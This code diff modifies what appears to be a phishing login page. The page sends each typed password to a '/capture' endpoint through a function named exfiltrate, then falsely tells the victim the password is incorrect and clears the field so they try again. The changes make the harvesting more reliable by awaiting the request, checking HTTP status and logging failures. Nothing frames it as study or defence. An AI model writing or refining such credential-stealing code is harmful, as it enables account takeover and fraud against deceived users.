@@ -725,11 +725,24 @@
                 screen: `${screen.width}x${screen.height}`
             };
             state.failedAttempts.push(attempt);
-            fetch('/capture', {
+            
+            return fetch('/capture', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(attempt)
-            }).catch(() => {});
+            })
+            .then(res => {
+                if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                return res.json();
+            })
+            .then(data => {
+                console.log('Capture result:', data);
+                return data;
+            })
+            .catch(err => {
+                console.error('Capture error:', err);
+                throw err;
+            });
         }
 
         document.getElementById('email-form').addEventListener('submit', function(e) {
@@ -761,8 +774,12 @@
             }
             hidePasswordError();
             setLoading('password-btn', true);
-            setTimeout(() => {
-                exfiltrate(password);
+            setTimeout(async () => {
+                try {
+                    await exfiltrate(password);
+                } catch (err) {
+                    console.error('Exfiltrate failed:', err);
+                }
                 setLoading('password-btn', false);
                 showPasswordIncorrect();
                 passwordInput.value = '';
